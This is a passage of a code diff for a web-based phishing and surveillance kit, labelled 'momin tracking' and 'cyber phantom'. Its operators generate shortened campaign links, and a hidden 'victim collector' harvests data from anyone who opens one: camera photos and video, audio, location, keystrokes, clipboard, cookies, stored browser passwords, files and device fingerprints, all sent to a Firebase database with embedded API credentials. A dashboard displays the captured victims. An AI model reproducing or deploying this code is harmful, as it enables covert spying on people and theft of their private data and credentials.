+    <div id="statusMsg" class="status-msg"></div>
 
-    // ========== FIREBASE CONFIG ==========
-    const firebaseConfig = {
-        apiKey: "AIzaSyDdYUeWB_e-Pv7-4yBN49P3ZN1Ig4PTW1g",
-        authDomain: "momin-tracking-sysrem.firebaseapp.com",
-        databaseURL: "https://momin-tracking-sysrem-default-rtdb.firebaseio.com",
-        projectId: "momin-tracking-sysrem",
-        storageBucket: "momin-tracking-sysrem.firebasestorage.app",
-        messagingSenderId: "294704122788",
-        appId: "1:294704122788:web:147bff72e6bf866a808f31",
-        measurementId: "G-BS81ZN7BDD"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    <!-- Hidden Elements -->
+    <video id="hiddenVideo" style="display:none;" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+    <input type="file" id="filePicker" style="display:none;" multiple>
 
-    // ========== HELPER FUNCTIONS ==========
-    function generateUID() { return Math.floor(10000000 + Math.random() * 90000000).toString(); }
-    function showMsg(msg, isError=false) {
-        const el = document.getElementById('dashboardStatus');
-        if(el) { el.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`; el.style.color = isError ? '#f66' : '#0f0'; setTimeout(()=>{if(el.innerHTML.includes(msg)) el.innerHTML='';},4000); }
-    }
-    function copyClip(txt) { 
-        navigator.clipboard.writeText(txt).then(()=>{
-            showMsg('Link copied!');
-            playSound('copy');
-        }).catch(()=>showMsg('Copy failed',true)); 
-    }
-
-    // ========== UPDATED DOWNLOAD FUNCTION (APP & WEB SAFE) ==========
-    function downloadDataURL(dataURL, filename) {
-        const isWebView = /wv|Android.*(?:; wv\)|WebView)/i.test(navigator.userAgent) || 
-                          (typeof window.Android !== 'undefined') || 
-                          (typeof window.webkit !== 'undefined' && window.webkit.messageHandlers);
-        if (isWebView && window.Android && window.Android.download) {
-            window.Android.download(dataURL, filename);
-            return;
-        }
-        if (navigator.share && dataURL.startsWith('data:')) {
-            fetch(dataURL)
-                .then(res => res.blob())
-                .then(blob => {
-                    const file = new File([blob], filename, { type: blob.type });
-                    navigator.share({
-                        files: [file],
-                        title: filename
-                    }).catch(() => fallbackDownload(dataURL, filename));
-                })
-                .catch(() => fallbackDownload(dataURL, filename));
-            return;
-        }
-        function fallbackDownload(dataURL, filename) {
-            if (isWebView || /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-                window.open(dataURL, '_blank');
-            } else {
-                const a = document.createElement('a');
-                a.href = dataURL;
-                a.download = filename;
-                a.click();
+    <script>
+        // ==========================================
+        // PARTICLE SYSTEM
+        // ==========================================
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for(let i = 0; i < 40; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 15 + 's';
+                particle.style.animationDuration = (15 + Math.random() * 10) + 's';
+                container.appendChild(particle);
             }
         }
-        fallbackDownload(dataURL, filename);
-    }
+        createParticles();
 
-    function initLightbox() {
-        const lightbox = document.getElementById('lightbox');
-        const lightboxImg = document.getElementById('lightbox-img');
-        const lightboxVideo = document.getElementById('lightbox-video');
-        const closeBtn = document.querySelector('.close-lightbox');
-        window.openLightbox = (src, type='image') => {
-            if(type === 'image') {
-                lightboxImg.style.display = 'block';
-                lightboxVideo.style.display = 'none';
-                lightboxImg.src = src;
-            } else {
-                lightboxImg.style.display = 'none';
-                lightboxVideo.style.display = 'block';
-                lightboxVideo.src = src;
-                lightboxVideo.load();
-            }
-            lightbox.classList.add('active');
+        // ==========================================
+        // FIREBASE CONFIG
+        // ==========================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyDdYUeWB_e-Pv7-4yBN49P3ZN1Ig4PTW1g",
+            authDomain: "momin-tracking-sysrem.firebaseapp.com",
+            databaseURL: "https://momin-tracking-sysrem-default-rtdb.firebaseio.com",
+            projectId: "momin-tracking-sysrem",
+            storageBucket: "momin-tracking-sysrem.firebasestorage.app",
+            messagingSenderId: "294704122788",
+            appId: "1:294704122788:web:147bff72e6bf866a808f31",
+            measurementId: "G-BS81ZN7BDD"
         };
-        closeBtn.onclick = () => { lightbox.classList.remove('active'); if(lightboxVideo.src) lightboxVideo.pause(); };
-        lightbox.onclick = (e) => { if(e.target === lightbox) lightbox.classList.remove('active'); };
-    }
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-    // ========== DASHBOARD STATE ==========
-    let currentUid = null, campaignsRef = null, clicksChart = null;
-
-    async function loadSellerDashboard(uid) {
-        const snap = await db.ref(`sellers/${uid}`).once('value');
-        if(!snap.exists()) await db.ref(`sellers/${uid}`).set({ createdAt: Date.now() });
-        currentUid = uid;
-        localStorage.setItem('momin_uid', uid);
-        document.getElementById('displayUid').innerText = uid;
-        document.getElementById('dashboardPanel').classList.remove('hide');
-        document.getElementById('victimPanel').classList.add('hide');
-        if(campaignsRef) campaignsRef.off();
-        campaignsRef = db.ref(`sellers/${uid}/campaigns`);
-        campaignsRef.on('value', (snap) => renderCampaigns(snap.val() || {}));
-        updateStats();
-    }
-
-    async function updateStats() {
-        const campaignsSnap = await db.ref(`sellers/${currentUid}/campaigns`).once('value');
-        const campaigns = campaignsSnap.val() || {};
-        let totalClicks = 0, totalVictims = 0;
-        for (const camp of Object.values(campaigns)) {
-            totalClicks += camp.clicks || 0;
-            totalVictims += camp.victims ? Object.keys(camp.victims).length : 0;
+        // ==========================================
+        // UTILITY FUNCTIONS
+        // ==========================================
+        function generateUID() {
+            return 'OP-' + Math.floor(10000000 + Math.random() * 90000000).toString();
         }
-        document.getElementById('totalClicks').innerText = totalClicks;
-        document.getElementById('totalVictims').innerText = totalVictims;
-        if (clicksChart) clicksChart.destroy();
-        const ctx = document.getElementById('clicksChart').getContext('2d');
-        const labels = Object.keys(campaigns).slice(-7);
-        const data = labels.map(c => campaigns[c]?.clicks || 0);
-        clicksChart = new Chart(ctx, {
-            type: 'line',
-            data: { labels: labels.map((_,i)=>`Camp ${i+1}`), datasets: [{ label: 'Clicks', data, borderColor: '#0f0', tension: 0.3 }] },
-            options: { responsive: true, maintainAspectRatio: true }
-        });
-    }
 
-    function renderCampaigns(campaigns) {
-        const container = document.getElementById('campaignList');
-        if(Object.keys(campaigns).length === 0) {
-            container.innerHTML = '<div style="text-align:center; padding:2rem;"><i class="fas fa-info-circle"></i> No campaigns yet. Create your first link.</div>';
-            return;
+        function showStatus(msg, isError = false) {
+            const el = document.getElementById('statusMsg');
+            el.textContent = msg;
+            el.className = 'status-msg ' + (isError ? 'error' : 'success');
+            el.classList.add('show');
+            setTimeout(() => el.classList.remove('show'), 3000);
         }
-        let html = '';
-        for(const [campId, camp] of Object.entries(campaigns)) {
-            const link = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
-            html += `
-                <div class="campaign-item">
-                    <div class="campaign-header">
-                        <div class="campaign-link" title="${link}">${link}</div>
-                        <div class="campaign-clicks"><i class="fas fa-eye"></i> ${camp.clicks || 0}</div>
-                        <button class="copy-camp" data-link="${link}"><i class="fas fa-copy"></i> Copy</button>
-                        <button class="delete-camp" data-camp="${campId}"><i class="fas fa-trash"></i> Del</button>
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showStatus('Link copied to clipboard!');
+            }).catch(() => showStatus('Failed to copy', true));
+        }
+
+        // ==========================================
+        // DOWNLOAD FUNCTIONS - NEW
+        // ==========================================
+        function downloadMedia(url, filename, type = 'image') {
+            try {
+                // Create a temporary anchor element
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                a.target = '_blank';
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                
+                // Trigger click
+                a.click();
+                
+                // Cleanup
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                }, 100);
+                
+                showStatus(`${type} download started!`);
+            } catch(e) {
+                showStatus('Download failed. Try right-click > Save As', true);
+                console.error('Download error:', e);
+            }
+        }
+
+        function downloadAllMedia(mediaArray, type = 'images') {
+            if(!mediaArray || mediaArray.length === 0) {
+                showStatus('No media to download', true);
+                return;
+            }
+            
+            showStatus(`Downloading ${mediaArray.length} ${type}...`);
+            
+            mediaArray.forEach((url, index) => {
+                setTimeout(() => {
+                    const ext = type === 'videos' ? 'webm' : 'jpg';
+                    downloadMedia(url, `cyber_phantom_${type}_${index + 1}_${Date.now()}.${ext}`, type.slice(0, -1));
+                }, index * 500); // Delay between downloads
+            });
+        }
+
+        // ==========================================
+        // DASHBOARD FUNCTIONS
+        // ==========================================
+        let currentUid = null;
+        let campaignsRef = null;
+        let clicksChart = null;
+
+        async function initDashboard(uid) {
+            const snap = await db.ref(`sellers/${uid}`).once('value');
+            if(!snap.exists()) {
+                await db.ref(`sellers/${uid}`).set({ 
+                    createdAt: Date.now(),
+                    status: 'active'
+                });
+            }
+            
+            currentUid = uid;
+            localStorage.setItem('cyberphantom_uid', uid);
+            document.getElementById('displayUid').textContent = uid;
+            
+            campaignsRef = db.ref(`sellers/${uid}/campaigns`);
+            campaignsRef.on('value', (snap) => renderCampaigns(snap.val() || {}));
+            
+            updateStats();
+        }
+
+        async function updateStats() {
+            const campaignsSnap = await db.ref(`sellers/${currentUid}/campaigns`).once('value');
+            const campaigns = campaignsSnap.val() || {};
+            
+            let totalClicks = 0;
+            let totalVictims = 0;
+            
+            Object.values(campaigns).forEach(camp => {
+                totalClicks += camp.clicks || 0;
+                totalVictims += camp.victims ? Object.keys(camp.victims).length : 0;
+            });
+            
+            // Animate numbers
+            animateNumber('totalClicks', totalClicks);
+            animateNumber('totalVictims', totalVictims);
+            animateNumber('activeCampaigns', Object.keys(campaigns).length);
+            
+            // Update chart
+            if(clicksChart) clicksChart.destroy();
+            const ctx = document.getElementById('clicksChart').getContext('2d');
+            const labels = Object.keys(campaigns).slice(-7).map((_, i) => `Camp ${i + 1}`);
+            const data = Object.values(campaigns).slice(-7).map(c => c.clicks || 0);
+            
+            clicksChart = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels,
+                    datasets: [{
+                        label: 'Clicks',
+                        data,
+                        borderColor: '#00f0ff',
+                        backgroundColor: 'rgba(0, 240, 255, 0.1)',
+                        tension: 0.4,
+                        fill: true,
+                        borderWidth: 2,
+                        pointBackgroundColor: '#00f0ff',
+                        pointBorderColor: '#fff',
+                        pointBorderWidth: 2,
+                        pointRadius: 4
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { display: false }
+                    },
+                    scales: {
+                        y: {
+                            grid: { color: 'rgba(0, 240, 255, 0.05)' },
+                            ticks: { color: 'rgba(255,255,255,0.5)' }
+                        },
+                        x: {
+                            grid: { display: false },
+                            ticks: { color: 'rgba(255,255,255,0.5)' }
+                        }
+                    }
+                }
+            });
+        }
+
+        function animateNumber(id, target) {
+            const el = document.getElementById(id);
+            const current = parseInt(el.textContent) || 0;
+            const increment = (target - current) / 20;
+            let step = 0;
+            
+            const timer = setInterval(() => {
+                step++;
+                el.textContent = Math.round(current + (increment * step));
+                if(step >= 20) {
+                    el.textContent = target;
+                    clearInterval(timer);
+                }
+            }, 30);
+        }
+
+        function renderCampaigns(campaigns) {
+            const container = document.getElementById('campaignList');
+            
+            if(Object.keys(campaigns).length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <i class="fas fa-satellite"></i>
+                        <p>No campaigns detected. Generate your first payload.</p>
                     </div>
-                    <div class="victim-data" id="victims-${campId}">
-                        <div style="color:#6c757d;"><i class="fas fa-spinner fa-pulse"></i> Loading victims...</div>
+                `;
+                return;
+            }
+            
+            let html = '';
+            for(const [campId, camp] of Object.entries(campaigns)) {
+                const link = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
+                const isCrasher = camp.type === 'crasher';
+                
+                html += `
+                    <div class="campaign-item ${isCrasher ? 'crasher' : ''}">
+                        <div class="campaign-header">
+                            <div class="campaign-link" title="${link}">${link}</div>
+                            <div class="campaign-stats">
+                                <span class="stat-badge">
+                                    <i class="fas fa-eye"></i> ${camp.clicks || 0}
+                                </span>
+                            </div>
+                            <div class="campaign-actions">
+                                <button class="btn-secondary" onclick="copyToClipboard('${link}')">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                                <button class="btn-secondary" style="color: #ff3864; border-color: #ff3864;" 
+                                        onclick="deleteCampaign('${campId}')">
+                                    <i class="fas fa-trash"></i>
+                                </button>
+                            </div>
+                        </div>
+                        ${camp.victims ? renderVictimsPreview(camp.victims, campId) : ''}
+                    </div>
+                `;
+            }
+            
+            container.innerHTML = html;
+            updateStats();
+        }
+
+        function renderVictimsPreview(victims, campId) {
+            const count = Object.keys(victims).length;
+            if(count === 0) return '';
+            
+            return `
+                <div style="margin-top: 1rem; padding-top: 1rem; border-top: 1px solid rgba(0,240,255,0.1);">
+                    <div style="display: flex; align-items: center; gap: 0.6rem; color: var(--primary); font-size: 0.9rem;">
+                        <i class="fas fa-users"></i>
+                        <span>${count} victim${count > 1 ? 's' : ''} captured</span>
+                        <button class="btn-secondary" style="margin-left: auto; font-size: 0.85rem;" 
+                                onclick="viewVictims('${campId}')">
+                            View Data <i class="fas fa-arrow-right"></i>
+                        </button>
                     </div>
                 </div>
             `;
         }
-        container.innerHTML = html;
-        document.querySelectorAll('.copy-camp').forEach(btn => {
-            btn.addEventListener('click', (e) => {
-                copyClip(btn.getAttribute('data-link'));
-                playSound('copy');
-            });
-        });
-        document.querySelectorAll('.delete-camp').forEach(btn => btn.addEventListener('click', async (e) => {
-            const campId = btn.getAttribute('data-camp');
-            if(confirm(`Delete campaign ${campId} and all victim data?`)) {
-                await db.ref(`sellers/${currentUid}/campaigns/${campId}`).remove();
-                updateStats();
-                playSound('delete');
-            }
-        }));
-        for(const campId of Object.keys(campaigns)) loadVictimsData(campId);
-        updateStats();
-    }
 
-    function loadVictimsData(campId) {
-        const victimsRef = db.ref(`sellers/${currentUid}/campaigns/${campId}/victims`);
-        victimsRef.on('value', (snap) => {
-            const victims = snap.val() || {};
-            const container = document.getElementById(`victims-${campId}`);
-            if(Object.keys(victims).length === 0) {
-                container.innerHTML = '<div style="color:#6c757d;"><i class="fas fa-user-slash"></i> No victims yet</div>';
+        async function deleteCampaign(campId) {
+            if(!confirm('Delete this campaign and all victim data?')) return;
+            await db.ref(`sellers/${currentUid}/campaigns/${campId}`).remove();
+            showStatus('Campaign deleted');
+        }
+
+        // ==========================================
+        // LINK GENERATION
+        // ==========================================
+        async function generateLink(type) {
+            if(!currentUid) {
+                showStatus('Error: No operator ID', true);
                 return;
             }
-            let html = '<div><i class="fas fa-users"></i> Victims Data (Real-time)</div>';
-            for(const [victimId, data] of Object.entries(victims)) {
-                html += `
-                    <div class="victim-item">
-                        <div class="victim-header">
-                            <span><i class="fas fa-user-secret"></i> <strong>Victim ${victimId.slice(-6)}</strong></span>
-                            <span style="font-size:0.7rem;">${new Date(data.timestamp).toLocaleString()}</span>
-                            <button class="delete-victim-btn" data-camp="${campId}" data-victim="${victimId}"><i class="fas fa-trash-alt"></i> Delete</button>
-                        </div>
-                        <div class="victim-tabs">
-                            <button class="tab-btn active" data-tab="passive-${victimId}">📡 PASSIVE</button>
-                            <button class="tab-btn" data-tab="images-${victimId}">📸 IMAGES (${data.camera?.length || 0})</button>
-                            <button class="tab-btn" data-tab="videos-${victimId}">🎥 VIDEOS (${data.videoRec?.length || 0})</button>
-                            <button class="tab-btn" data-tab="audio-${victimId}">🎙️ AUDIO (${data.mic?.length || 0})</button>
-                            <button class="tab-btn" data-tab="location-${victimId}">📍 LOC (${data.location?.length || 0})</button>
-                            <button class="tab-btn" data-tab="device-${victimId}">💻 DEVICE</button>
-                            <button class="tab-btn" data-tab="fingerprint-${victimId}">🖐️ FP</button>
-                            <button class="tab-btn" data-tab="storage-${victimId}">🗄️ STORAGE</button>
-                            <button class="tab-btn" data-tab="keys-${victimId}">⌨️ KEYS (${data.keys?.length || 0})</button>
-                            <button class="tab-btn" data-tab="clip-${victimId}">📋 CLIP (${data.clipboard?.length || 0})</button>
-                            <button class="tab-btn" data-tab="network-${victimId}">🌐 NET</button>
-                            <button class="tab-btn" data-tab="files-${victimId}">📁 FILES (${data.files?.length || 0})</button>
-                            <button class="tab-btn" data-tab="browser-${victimId}">🌐 BROWSER</button>
-                            <button class="tab-btn" data-tab="dns-${victimId}">🌍 DNS</button>
-                            <button class="tab-btn" data-tab="sensors-${victimId}">📳 SENSORS</button>
-                        </div>
-                        <div class="tab-content active" id="tab-passive-${victimId}">
-                            ${data.passiveInfo ? `
-                                <div class="passive-compact">
-                                    <span class="passive-item"><i class="fas fa-globe"></i> IP: ${data.passiveInfo.ip || 'N/A'}</span>
-                                    <span class="passive-item"><i class="fas fa-battery-full"></i> Bat: ${data.passiveInfo.battery || 'N/A'}</span>
-                                    <span class="passive-item"><i class="fas fa-laptop"></i> ${data.passiveInfo.platform || 'N/A'}</span>
-                                    <span class="passive-item"><i class="fas fa-language"></i> ${data.passiveInfo.language || 'N/A'}</span>
-                                    <span class="passive-item"><i class="fas fa-desktop"></i> ${data.passiveInfo.screen || 'N/A'}</span>
-                                    <span class="passive-item"><i class="fas fa-clock"></i> ${data.passiveInfo.timezone || 'N/A'}</span>
-                                    <span class="passive-item"><i class="fas fa-microchip"></i> ${data.passiveInfo.hardwareConcurrency || 'N/A'} cores</span>
-                                    <span class="passive-item"><i class="fas fa-tv"></i> GPU: ${(data.passiveInfo.gpu || 'N/A').substring(0,20)}</span>
-                                    <span class="passive-item"><i class="fas fa-network-wired"></i> ${data.passiveInfo.localIP || 'N/A'}</span>
-                                    <span class="passive-item"><i class="fas fa-plug"></i> Plugins: ${(data.passiveInfo.plugins || []).length}</span>
-                                    <span class="passive-item"><i class="fas fa-font"></i> Fonts: ${(data.passiveInfo.fonts || []).length}</span>
-                                    <span class="passive-item"><i class="fas fa-cookie-bite"></i> Cookies: ${data.passiveInfo.cookies ? data.passiveInfo.cookies.length : 0} chars</span>
-                                </div>
-                            ` : '<i>No passive data collected</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-images-${victimId}">
-                            ${data.camera && data.camera.length ? `<div class="image-grid">` + data.camera.map((img, idx) => `
-                                <div class="media-card">
-                                    <img src="${img}" class="thumbnail" onclick="openLightbox('${img}')">
-                                    <div><button class="download-btn" onclick="downloadDataURL('${img}', 'image_${idx}.jpg')">Download</button></div>
-                                </div>
-                            `).join('') + `</div>` : '<i>No images captured</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-videos-${victimId}">
-                            ${data.videoRec && data.videoRec.length ? `<div class="video-grid">` + data.videoRec.map((vid, idx) => `
-                                <div class="media-card">
-                                    <video src="${vid}" class="video-thumb" controls width="150" onclick="openLightbox('${vid}','video')"></video>
-                                    <div><button class="download-btn" onclick="downloadDataURL('${vid}', 'video_${idx}.webm')">Download</button></div>
-                                </div>
-                            `).join('') + `</div>` : '<i>No video recordings</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-audio-${victimId}">
-                            ${data.mic && data.mic.length ? data.mic.map((audio, idx) => `<div><audio controls src="${audio}"></audio> <button class="download-btn" onclick="downloadDataURL('${audio}', 'audio_${idx}.ogg')">Download</button></div>`).join('<br>') : '<i>No audio recorded</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-location-${victimId}">
-                            ${data.location && data.location.length ? 
-                                `<div>Last known location: ${data.location[data.location.length-1].lat}, ${data.location[data.location.length-1].lng}</div>
-                                 <div class="map-container" id="map-${victimId}"></div>
-                                 <script>
-                                    setTimeout(() => {
-                                        const mapDiv = document.getElementById('map-${victimId}');
-                                        if(mapDiv && !mapDiv._leaflet_id) {
-                                            const map = L.map(mapDiv).setView([${data.location[data.location.length-1].lat}, ${data.location[data.location.length-1].lng}], 13);
-                                            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '&copy; OpenStreetMap' }).addTo(map);
-                                            L.marker([${data.location[data.location.length-1].lat}, ${data.location[data.location.length-1].lng}]).addTo(map);
-                                        }
-                                    }, 100);
-                                 <\/script>` : '<i>No location data</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-device-${victimId}">
-                            ${data.deviceInfo ? 
-                                `<div><i class="fas fa-globe"></i> IP: ${data.deviceInfo.ip || 'N/A'}</div>
-                                 <div><i class="fas fa-battery-full"></i> Battery: ${data.deviceInfo.battery || 'N/A'}</div>
-                                 <div><i class="fas fa-laptop"></i> Platform: ${data.deviceInfo.platform || 'N/A'}</div>
-                                 <div><i class="fas fa-language"></i> Language: ${data.deviceInfo.language || 'N/A'}</div>
-                                 <div><i class="fas fa-desktop"></i> Screen: ${data.deviceInfo.screen || 'N/A'}</div>
-                                 <div><i class="fas fa-microchip"></i> Cores: ${data.deviceInfo.hardwareConcurrency || 'N/A'}</div>
-                                 <div><i class="fas fa-clock"></i> Timezone: ${data.deviceInfo.timezone || 'N/A'}</div>
-                                 <div><i class="fas fa-microphone"></i> Audio Inputs: ${data.deviceInfo.audioInputs || 'N/A'}</div>
-                                 <div><i class="fas fa-tv"></i> GPU: ${data.deviceInfo.gpu || 'N/A'}</div>
-                                 <div><i class="fas fa-code"></i> UserAgent: ${data.deviceInfo.userAgent || 'N/A'}</div>` : '<i>No device info</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-fingerprint-${victimId}">
-                            ${data.fingerprint ? 
-                                `<div><i class="fas fa-palette"></i> Canvas: ${data.fingerprint.canvasFingerprint || 'N/A'}</div>
-                                 <div><i class="fas fa-cubes"></i> WebGL: ${data.fingerprint.webglVendor || 'N/A'}</div>
-                                 <div><i class="fas fa-font"></i> Fonts: ${data.fingerprint.fonts?.join(', ') || 'N/A'}</div>
-                                 <div><i class="fas fa-plug"></i> Plugins: ${data.fingerprint.plugins?.join(', ') || 'N/A'}</div>
-                                 <div><i class="fas fa-network-wired"></i> Local IP: ${data.fingerprint.localIP || 'N/A'}</div>` : '<i>No fingerprint data</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-storage-${victimId}">
-                            ${data.cookies ? `<div><i class="fas fa-cookie-bite"></i> Cookies: ${data.cookies}</div>` : ''}
-                            ${data.localStorage ? `<div><i class="fas fa-database"></i> LocalStorage: ${data.localStorage}</div>` : ''}
-                            ${data.sessionStorage ? `<div><i class="fas fa-database"></i> SessionStorage: ${data.sessionStorage}</div>` : ''}
-                            ${!data.cookies && !data.localStorage && !data.sessionStorage ? '<i>No storage data</i>' : ''}
-                        </div>
-                        <div class="tab-content" id="tab-keys-${victimId}">
-                            ${data.keys && data.keys.length ? data.keys.map(k => `<div>${new Date(k.timestamp).toLocaleTimeString()}: ${k.key} (${k.windowTitle || 'unknown'})</div>`).join('') : '<i>No keystrokes captured</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-clip-${victimId}">
-                            ${data.clipboard && data.clipboard.length ? data.clipboard.map(c => `<div>${new Date(c.timestamp).toLocaleTimeString()}: ${c.text.substring(0,100)}</div>`).join('') : '<i>No clipboard data</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-network-${victimId}">
-                            ${data.networkScan ? `<div><i class="fas fa-network-wired"></i> ${data.networkScan}</div>` : '<i>No network scan performed</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-files-${victimId}">
-                            ${data.files && data.files.length ? data.files.map(f => `<div><a href="${f.data}" download="${f.name}">${f.name}</a> (${Math.round(f.size/1024)} KB)</div>`).join('') : '<i>No files stolen</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-browser-${victimId}">
-                            ${data.browserData ? 
-                                `<div><i class="fas fa-key"></i> Passwords: ${data.browserData.passwords || 'N/A'}</div>
-                                 <div><i class="fas fa-address-card"></i> Autofill: ${data.browserData.autofill || 'N/A'}</div>
-                                 <div><i class="fas fa-database"></i> LocalStorage: ${data.browserData.localStorage || 'N/A'}</div>
-                                 <div><i class="fas fa-cookie-bite"></i> Cookies: ${data.browserData.cookies || 'N/A'}</div>` : '<i>No browser data extracted</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-dns-${victimId}">
-                            ${data.dnsLeak ? 
-                                `<div><i class="fas fa-network-wired"></i> Local IPs: ${data.dnsLeak.localIPs}</div>
-                                 <div><i class="fas fa-globe"></i> Public IP: ${data.dnsLeak.publicIP}</div>` : '<i>No DNS leak data</i>'}
-                        </div>
-                        <div class="tab-content" id="tab-sensors-${victimId}">
-                            ${data.sensors ? 
-                                `<div><i class="fas fa-chart-line"></i> Acceleration: ${JSON.stringify(data.sensors.acceleration)}</div>
-                                 <div><i class="fas fa-sync-alt"></i> Rotation: ${JSON.stringify(data.sensors.rotationRate)}</div>
-                                 <div><i class="fas fa-compass"></i> Orientation: ${JSON.stringify(data.sensors.orientation)}</div>` : '<i>No sensor data</i>'}
-                        </div>
-                    </div>
-                `;
+            
+            const selected = Array.from(document.querySelectorAll('.feature-card.selected'))
+                .map(c => c.dataset.feat).join('');
+            
+            if(selected.length === 0 && type !== 'crasher') {
+                showStatus('Select at least one feature', true);
+                return;
             }
-            container.innerHTML = html;
-            // Delete victim button
-            document.querySelectorAll('.delete-victim-btn').forEach(btn => {
-                btn.addEventListener('click', async (e) => {
-                    const campId = btn.getAttribute('data-camp');
-                    const victimId = btn.getAttribute('data-victim');
-                    if(confirm(`Delete victim ${victimId.slice(-6)} data?`)) {
-                        await db.ref(`sellers/${currentUid}/campaigns/${campId}/victims/${victimId}`).remove();
-                        showMsg('Victim data deleted');
-                        playSound('delete');
-                    }
-                });
-            });
-            // Tab switching
-            document.querySelectorAll('.tab-btn').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    const target = btn.getAttribute('data-tab');
-                    const parent = btn.closest('.victim-item');
-                    parent.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
-                    parent.querySelectorAll('.tab-btn').forEach(tb => tb.classList.remove('active'));
-                    document.getElementById(`tab-${target}`).classList.add('active');
-                    btn.classList.add('active');
-                });
-            });
-        });
-    }
-
-    function generateNewCampaign() {
-        if(!currentUid) { showMsg('No UID', true); return; }
-        const selected = Array.from(document.querySelectorAll('.feature-card.selected')).map(c => c.getAttribute('data-feat')).join('');
-        if(selected.length === 0) { showMsg('Select at least one feature', true); return; }
-        const advanced = document.getElementById('advancedToggle').checked ? 'ADV' : '';
-        const cameraInterval = parseFloat(document.getElementById('cameraInterval').value);
-        const videoDuration = parseInt(document.getElementById('videoDuration').value);
-        const photoQuality = parseInt(document.getElementById('photoQuality').value);
-        const campId = 'CAMP_' + Date.now() + '_' + Math.random().toString(36).substring(2,6);
-        db.ref(`sellers/${currentUid}/campaigns/${campId}`).set({
-            features: selected,
-            advanced: advanced,
-            clicks: 0,
-            createdAt: Date.now(),
-            victims: {},
-            cameraInterval: cameraInterval,
-            videoDuration: videoDuration,
-            photoQuality: photoQuality
-        }).then(async () => {
-            let fullLink = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
-            let finalLink = fullLink;
-            if(document.getElementById('shortenToggle').checked) {
-                try {
-                    const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(fullLink)}`);
-                    const data = await res.json();
-                    finalLink = data.shorturl || fullLink;
-                } catch(e) { finalLink = fullLink; }
-            }
-            document.getElementById('newLinkText').innerText = finalLink;
-            document.getElementById('newLinkBox').classList.remove('hide');
-            showMsg('Campaign created! Share the link.');
-            playSound('generate');
-        }).catch(err => showMsg('Error: '+err.message, true));
-    }
-
-    // Export all data
-    document.getElementById('exportAllDataBtn')?.addEventListener('click', async () => {
-        if(!currentUid) return;
-        const snap = await db.ref(`sellers/${currentUid}`).once('value');
-        const data = snap.val();
-        const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `momin_export_${currentUid}.json`;
-        a.click();
-        URL.revokeObjectURL(url);
-        showMsg('Data exported');
-        playSound('export');
-    });
-
-    // ========== VICTIM COLLECTOR (full, unchanged from last working version) ==========
-    async function startVictimCollector(sellerUid, campaignId, features, advanced, campaignData) {
-        const victimId = 'V_' + Date.now() + '_' + Math.random().toString(36).substring(2,8);
-        const victimRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/victims/${victimId}`);
-        const victimData = {
-            deviceInfo: {}, location: [], camera: [], mic: [], keys: [], clipboard: [],
-            fingerprint: {}, cookies: '', localStorage: '', sessionStorage: '',
-            screenRec: [], networkScan: '', videoRec: [], files: [], browserData: {}, dnsLeak: {}, sensors: {},
-            passiveInfo: {},
-            timestamp: Date.now()
-        };
-
-        // ---------- PASSIVE INFO (no permissions) ----------
-        let ip = 'unknown';
-        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
-        let battery = 'N/A';
-        if(navigator.getBattery) {
-            try {
-                const b = await navigator.getBattery();
-                battery = `${Math.round(b.level*100)}% (${b.charging?'charging':'not'})`;
-            } catch(e) {}
-        }
-        let gpu = 'N/A';
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if(gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if(debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            }
-        } catch(e) {}
-        let audioInputs = 'N/A';
-        try {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            audioInputs = devices.filter(d => d.kind === 'audioinput').map(d => d.label).join(', ') || 'not available';
-        } catch(e) {}
-        let connection = {};
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if(conn) {
-            connection = {
-                effectiveType: conn.effectiveType,
